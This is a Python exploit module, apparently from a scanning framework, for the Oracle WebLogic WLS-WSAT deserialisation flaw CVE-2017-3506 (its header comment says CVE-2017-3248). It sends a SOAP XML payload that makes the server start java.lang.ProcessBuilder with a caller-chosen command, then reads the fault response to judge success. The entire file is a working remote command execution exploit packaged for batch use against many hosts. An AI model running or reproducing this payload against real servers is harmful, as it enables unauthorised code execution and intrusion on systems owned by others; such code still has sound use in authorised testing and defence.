#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2017-3248
# 该漏洞不会直接回显
# updated 2019/11/1
# by 0xn0ne

from stars import target_type, Star
from utils import http
from multiprocessing.managers import SyncManager
from typing import Any, Dict, List, Mapping, Tuple, Union


# @universe.groups()
class CVE_2017_3506(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE-2017-3506',
        'TAG': []
    }
    type = target_type.VULNERABILITY

    def light_up(self, dip, dport, force_ssl=None, cmd='whoami', *args, **kwargs) -> (bool, dict):
        url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(dip, dport)
        data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                '''
        for idx, it in enumerate(cmd.split()):
            data += '<void index="{}"><string>{}</string></void>'.format(
                idx, it)
        data += '''
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>'''

        headers = {'Content-Type': 'text/xml'}
        res, data = http(url, 'POST', headers, data=data, ssl=force_ssl)
        return res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text), {
            'msg': 'finish.'}


def run(queue: SyncManager.Queue, data: Dict):
    obj = CVE_2017_3506()
    result = {
        'IP': data['IP'],
        'PORT': data['PORT'],
        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
        'MSG': '',
        'STATE': False
    }
    result['STATE'], result['MSG'] = obj.light_and_msg(
        data['IP'], data['PORT'], data['IS_SSL'])

    queue.put(result)
